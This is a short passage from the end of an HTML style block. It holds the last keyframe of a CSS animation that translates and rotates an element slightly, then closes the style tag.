        40%, 80% { transform: translate(2px, -2px) rotate(1deg); }
    }
</style>